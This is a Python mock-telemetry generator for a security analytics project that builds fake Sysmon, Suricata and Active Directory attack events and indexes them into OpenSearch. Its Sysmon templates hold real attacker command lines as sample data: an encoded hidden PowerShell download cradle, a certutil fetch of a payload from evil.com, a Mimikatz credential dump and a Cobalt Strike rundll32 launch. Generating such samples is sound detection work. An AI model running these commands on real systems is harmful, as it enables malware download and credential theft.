"""
NeoVigil — Multi-Modal Telemetry Generator
===========================================
Enterprise-grade mock log ingestion across three telemetry layers:

  1. Endpoint / EDR  — Sysmon Event ID 1 (Process Creation)
  2. Network / NDR   — Suricata EVE JSON alerts
  3. Identity        — Windows Active Directory security events

Each payload is vectorised via the local LLM embedding model and
indexed into the ``security-logs-knn`` OpenSearch index for
downstream RAG retrieval, anomaly detection, and Phase 1 prediction.
"""

import os
import random
import time
import uuid
from datetime import datetime, timezone, timedelta
from dotenv import load_dotenv

load_dotenv()

from opensearchpy import OpenSearch
try:
    from src.llm_client import LLMClient
except ImportError:
    from llm_client import LLMClient

# ─── Clients ──────────────────────────────────────────────────

llm = LLMClient()

client = OpenSearch(
    hosts=[{"host": os.getenv("OPENSEARCH_HOST", "localhost"),
            "port": int(os.getenv("OPENSEARCH_PORT", "9200"))}],
    http_compress=True,
    use_ssl=False,
)

INDEX_NAME = "security-logs-knn"


# ════════════════════════════════════════════════════════════════
#  Helper — timestamps & IPs
# ════════════════════════════════════════════════════════════════

def _ts(offset_seconds: int = 0) -> str:
    """Return an ISO-8601 UTC timestamp with an optional offset."""
    return (datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)).isoformat()


def _rand_internal_ip() -> str:
    """Random RFC-1918 internal IP."""
    return f"10.{random.randint(0,255)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _rand_external_ip() -> str:
    """Random external IP (non-reserved)."""
    return f"{random.choice([45,62,91,103,141,185,195,212])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


# ════════════════════════════════════════════════════════════════
#  SOURCE 1 — Sysmon / EDR  (Event ID 1: Process Creation)
# ════════════════════════════════════════════════════════════════

_SYSMON_TEMPLATES = [
    # 1. Encoded PowerShell download cradle
    {
        "ParentImage": "C:\\Windows\\explorer.exe",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcABhAHkAbABvAGEAZAAnACkA",
        "Hashes": "SHA256=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
        "User": "CORP\\jsmith",
        "IntegrityLevel": "High",
        "severity": "Critical",
        "attack_type": "Encoded PowerShell Execution",
        "technique": "T1059.001",
    },
    # 2. Mimikatz credential dumping
    {
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\mimi.exe",
        "CommandLine": "mimi.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "User": "CORP\\admin",
        "IntegrityLevel": "System",
        "severity": "Critical",
        "attack_type": "Credential Dumping (Mimikatz)",
        "technique": "T1003.001",
    },
    # 3. Cobalt Strike beacon via rundll32
    {
        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe C:\\Users\\Public\\beacon.dll,StartW",
        "Hashes": "SHA256=deadbeef01234567890abcdef01234567890abcdef01234567890abcdef012345",
        "User": "CORP\\svc_backup",
        "IntegrityLevel": "High",
        "severity": "Critical",
        "attack_type": "Cobalt Strike Beacon Execution",
        "technique": "T1218.011",
    },
    # 4. Living-off-the-land: certutil download
    {
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\svc.exe",
        "Hashes": "SHA256=1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        "User": "CORP\\helpdesk01",
        "IntegrityLevel": "Medium",
        "severity": "High",
        "attack_type": "LOLBin File Download (certutil)",
        "technique": "T1105",
    },
    # 5. Scheduled task persistence
    {
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\Public\\update.exe\" /sc onlogon /ru SYSTEM",
        "Hashes": "SHA256=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
        "User": "CORP\\admin",
        "IntegrityLevel": "High",
        "severity": "High",
        "attack_type": "Persistence via Scheduled Task",
        "technique": "T1053.005",
    },
]


def _generate_sysmon_event() -> dict:
    """Generate a single Sysmon Event ID 1 payload."""
    tpl = random.choice(_SYSMON_TEMPLATES)
    src_host = random.choice(["ws-fin-01", "ws-hr-03", "ws-dev-07", "ws-exec-02", "srv-app-01"])
    return {
        "timestamp": _ts(random.randint(-300, 0)),
        "telemetry_source": "sysmon",
        "tenant_id": "default",
        "event_id": 1,
        "event_type": "ProcessCreate",
        "hostname": src_host,
        "source_ip": _rand_internal_ip(),
        "ParentImage": tpl["ParentImage"],
        "Image": tpl["Image"],
        "CommandLine": tpl["CommandLine"],
        "Hashes": tpl["Hashes"],
        "User": tpl["User"],
        "IntegrityLevel": tpl["IntegrityLevel"],
        "ProcessId": random.randint(1000, 65535),
        "ParentProcessId": random.randint(100, 9999),
        "severity": tpl["severity"],
        "attack_type": tpl["attack_type"],
        "technique": tpl["technique"],
        "log_text": (
            f"Sysmon EventID=1 | Host={src_host} | "
            f"Image={tpl['Image']} | "
            f"CommandLine={tpl['CommandLine'][:80]}... | "
            f"User={tpl['User']} | Integrity={tpl['IntegrityLevel']}"
        ),
    }


# ════════════════════════════════════════════════════════════════
#  SOURCE 2 — Suricata / NDR  (EVE JSON)
# ════════════════════════════════════════════════════════════════

_SURICATA_TEMPLATES = [
    # 1. Nmap SYN scan detection
    {
        "alert_signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",
        "alert_signature_id": 2024364,
        "alert_category": "Attempted Information Leak",
        "alert_severity": 2,
        "proto": "TCP",
        "dest_port": 80,
        "severity": "High",
        "attack_type": "Network Reconnaissance (Nmap)",
        "technique": "T1046",
    },
    # 2. DNS tunneling C2
    {
        "alert_signature": "ET TROJAN DNS Tunneling Suspicious Query Length (>128)",
        "alert_signature_id": 2027863,
        "alert_category": "A Network Trojan was detected",
        "alert_severity": 1,
        "proto": "UDP",
        "dest_port": 53,
        "severity": "Critical",
        "attack_type": "DNS Tunneling Command & Control",
        "technique": "T1071.004",
    },
    # 3. Lateral movement via SMB
    {
        "alert_signature": "ET EXPLOIT Possible EternalBlue SMB Exploit MS17-010",
        "alert_signature_id": 2024297,
        "alert_category": "Attempted Administrator Privilege Gain",
        "alert_severity": 1,
        "proto": "TCP",
        "dest_port": 445,
        "severity": "Critical",
        "attack_type": "SMB Exploit (EternalBlue)",
        "technique": "T1210",
    },
    # 4. Outbound C2 beacon
    {
        "alert_signature": "ET MALWARE Cobalt Strike Beacon Activity (GET)",
        "alert_signature_id": 2032749,
        "alert_category": "Malware Command and Control Activity Detected",
        "alert_severity": 1,
        "proto": "TCP",
        "dest_port": 443,
        "severity": "Critical",
        "attack_type": "Cobalt Strike C2 Beacon",
        "technique": "T1071.001",
    },
    # 5. SSH brute force
    {
        "alert_signature": "ET SCAN LibSSH Based SSH Brute Force",
        "alert_signature_id": 2019876,
        "alert_category": "Attempted Information Leak",
        "alert_severity": 2,
        "proto": "TCP",
        "dest_port": 22,
        "severity": "High",
        "attack_type": "SSH Brute Force Scan",
        "technique": "T1110.001",
    },
]


def _generate_suricata_event() -> dict:
    """Generate a single Suricata EVE JSON alert payload."""
    tpl = random.choice(_SURICATA_TEMPLATES)
    src_ip = _rand_external_ip()
    dest_ip = _rand_internal_ip()
    flow_id = random.randint(10**15, 10**16 - 1)
    return {
        "timestamp": _ts(random.randint(-300, 0)),
        "telemetry_source": "suricata",
        "tenant_id": "default",
        "event_type": "alert",
        "source_ip": src_ip,
        "src_port": random.randint(1024, 65535),
        "dest_ip": dest_ip,
        "dest_port": tpl["dest_port"],
        "proto": tpl["proto"],
        "flow_id": flow_id,
        "alert": {
            "action": "allowed",
            "gid": 1,
            "signature_id": tpl["alert_signature_id"],
            "rev": random.randint(1, 10),
            "signature": tpl["alert_signature"],
            "category": tpl["alert_category"],
            "severity": tpl["alert_severity"],
        },
        "severity": tpl["severity"],
        "attack_type": tpl["attack_type"],
        "technique": tpl["technique"],
        "log_text": (
            f"Suricata Alert | SID={tpl['alert_signature_id']} | "
            f"Sig={tpl['alert_signature']} | "
            f"{src_ip}:{random.randint(1024,65535)} -> {dest_ip}:{tpl['dest_port']} | "
            f"Proto={tpl['proto']}"
        ),
    }


# ════════════════════════════════════════════════════════════════
#  SOURCE 3 — Windows Active Directory / Identity
# ════════════════════════════════════════════════════════════════

_IDENTITY_TEMPLATES = [
    # 1. Brute-force failed login (4625)
    {
        "event_id": 4625,
        "event_name": "Failed Logon",
        "logon_type": 10,
        "logon_type_name": "RemoteInteractive",
        "status": "0xC000006D",
        "sub_status": "0xC000006A",
        "status_text": "Unknown user name or bad password",
        "target_user": "administrator",
        "severity": "High",
        "attack_type": "Brute Force Authentication",
        "technique": "T1110.001",
    },
    # 2. Kerberos TGT request for service account (Kerberoasting)
    {
        "event_id": 4768,
        "event_name": "Kerberos TGT Request",
        "logon_type": 3,
        "logon_type_name": "Network",
        "status": "0x0",
        "sub_status": "0x0",
        "status_text": "Success — suspicious SPN request",
        "target_user": "svc_sql",
        "severity": "High",
        "attack_type": "Kerberoasting (TGT Request)",
        "technique": "T1558.003",
    },
    # 3. Suspicious account creation (4720)
    {
        "event_id": 4720,
        "event_name": "User Account Created",
        "logon_type": 3,
        "logon_type_name": "Network",
        "status": "0x0",
        "sub_status": "0x0",
        "status_text": "Privileged account created outside change window",
        "target_user": "backdoor_admin$",
        "severity": "Critical",
        "attack_type": "Persistence — Rogue Admin Account",
        "technique": "T1136.001",
    },
    # 4. Pass-the-Hash (4624 Type 3 with NTLM)
    {
        "event_id": 4624,
        "event_name": "Successful Logon (NTLM)",
        "logon_type": 3,
        "logon_type_name": "Network",
        "status": "0x0",
        "sub_status": "0x0",
        "status_text": "NTLM logon from non-standard workstation",
        "target_user": "domain_admin",
        "severity": "Critical",
        "attack_type": "Pass-the-Hash Lateral Movement",
        "technique": "T1550.002",
    },
    # 5. Multiple failed logons (distributed brute force)
    {
        "event_id": 4625,
        "event_name": "Failed Logon",
        "logon_type": 3,
        "logon_type_name": "Network",
        "status": "0xC0000064",
        "sub_status": "0xC0000064",
        "status_text": "User name does not exist (spray attempt)",
        "target_user": "ceo",
        "severity": "High",
        "attack_type": "Password Spray Attack",
        "technique": "T1110.003",
    },
]


def _generate_identity_event() -> dict:
    """Generate a single Windows AD security event payload."""
    tpl = random.choice(_IDENTITY_TEMPLATES)
    src_ip = random.choice([_rand_external_ip(), _rand_internal_ip()])
    dc_host = random.choice(["dc-primary", "dc-backup", "dc-dr-01"])
    return {
        "timestamp": _ts(random.randint(-300, 0)),
        "telemetry_source": "windows_ad",
        "tenant_id": "default",
        "event_id": tpl["event_id"],
        "event_name": tpl["event_name"],
        "hostname": dc_host,
        "source_ip": src_ip,
        "dest_ip": _rand_internal_ip(),
        "LogonType": tpl["logon_type"],
        "LogonTypeName": tpl["logon_type_name"],
        "TargetUserName": tpl["target_user"],
        "TargetDomainName": "NEOVIGIL",
        "Status": tpl["status"],
        "SubStatus": tpl["sub_status"],
        "StatusText": tpl["status_text"],
        "AuthenticationPackageName": random.choice(["NTLM", "Kerberos"]),
        "WorkstationName": random.choice(["WS-UNK-01", "WS-FIN-02", "WS-HR-05", ""]),
        "severity": tpl["severity"],
        "attack_type": tpl["attack_type"],
        "technique": tpl["technique"],
        "log_text": (
            f"Windows AD EventID={tpl['event_id']} | "
            f"{tpl['event_name']} | DC={dc_host} | "
            f"User={tpl['target_user']} | "
            f"Src={src_ip} | Status={tpl['status_text']}"
        ),
    }


# ════════════════════════════════════════════════════════════════
#  Baseline (benign) logs — kept from original for noise floor
# ════════════════════════════════════════════════════════════════

_BASELINE_LOGS = [
    "User admin logged in successfully from IP 192.168.1.5 via SSH.",
    "User alice logged in successfully from IP 192.168.1.6 via SSH.",
    "User bob logged in successfully from IP 10.0.0.12 via VPN.",
    "Accepted password for root from 192.168.1.200 port 22 ssh2.",
    "System scheduled backup started at 02:00 AM.",
    "System backup completed successfully. Duration: 15 mins.",
    "Cron job /etc/cron.daily/logrotate executed.",
    "Service docker restarted successfully.",
    "Web server apache2 restarted successfully.",
    "Service nginx status: active (running).",
    "File server synced 500 files to cloud storage.",
    "Database connection pool initialized with 10 connections.",
    "Network interface eth0 up, speed 1000Mbps.",
    "Firewall allowed outgoing traffic to 8.8.8.8 on port 53.",
    "Antivirus scan completed. No threats found.",
    "Windows Defender signature updated to version 1.2.3.",
    "System integrity check passed. No changes detected.",
]


# ════════════════════════════════════════════════════════════════
#  Main ingestion loop
# ════════════════════════════════════════════════════════════════

# Source weights: 30% Sysmon, 30% Suricata, 20% AD, 20% baseline
_GENERATORS = [
    (_generate_sysmon_event, 0.30),
    (_generate_suricata_event, 0.30),
    (_generate_identity_event, 0.20),
]
_BASELINE_WEIGHT = 0.20


def _pick_log() -> dict:
    """Pick a random log payload using weighted selection."""
    roll = random.random()
    cumulative = 0.0
    for gen_fn, weight in _GENERATORS:
        cumulative += weight
        if roll < cumulative:
            return gen_fn()

    # Baseline (plain text, no structured fields)
    text = random.choice(_BASELINE_LOGS)
    return {
        "timestamp": _ts(),
        "telemetry_source": "baseline",
        "tenant_id": "default",
        "log_text": text,
        "severity": "Low",
    }


def ingest_data(count: int = 60):
    """Generate and ingest *count* enterprise telemetry events.

    Each event is embedded via the local LLM and indexed to
    ``security-logs-knn`` for downstream RAG retrieval.

    Parameters
    ----------
    count : int
        Total number of log events to generate (default 60).
    """
    print(f"\n  ╔══════════════════════════════════════════════════════╗")
    print(f"  ║   NeoVigil Multi-Modal Telemetry Generator          ║")
    print(f"  ║   Sources: Sysmon | Suricata | Active Directory     ║")
    print(f"  ╚══════════════════════════════════════════════════════╝\n")

    stats = {"sysmon": 0, "suricata": 0, "windows_ad": 0, "baseline": 0}

    for i in range(count):
        event = _pick_log()
        source = event.get("telemetry_source", "baseline")
        log_text = event.get("log_text", str(event))

        # Display progress
        src_label = {
            "sysmon": "EDR ",
            "suricata": "NDR ",
            "windows_ad": "IDN ",
            "baseline": "BASE",
        }.get(source, "????")
        print(f"  [{i+1:>3}/{count}] [{src_label}] {log_text[:75]}...")

        try:
            embedding = llm.get_embedding(log_text)
            doc = {
                **event,
                "log_vector": embedding,
            }
            client.index(index=INDEX_NAME, body=doc)
            stats[source] = stats.get(source, 0) + 1
        except Exception as e:
            print(f"  [ERR] {e}")

    client.indices.refresh(index=INDEX_NAME)

    print(f"\n  ─── Ingestion Summary ───────────────────────────────")
    print(f"  Total ingested:   {count}")
    for src, n in sorted(stats.items()):
        print(f"    {src:<14s}  {n}")
    print(f"  ─────────────────────────────────────────────────────")
    print(f"  All telemetry indexed to '{INDEX_NAME}' successfully!\n")


if __name__ == "__main__":
    ingest_data()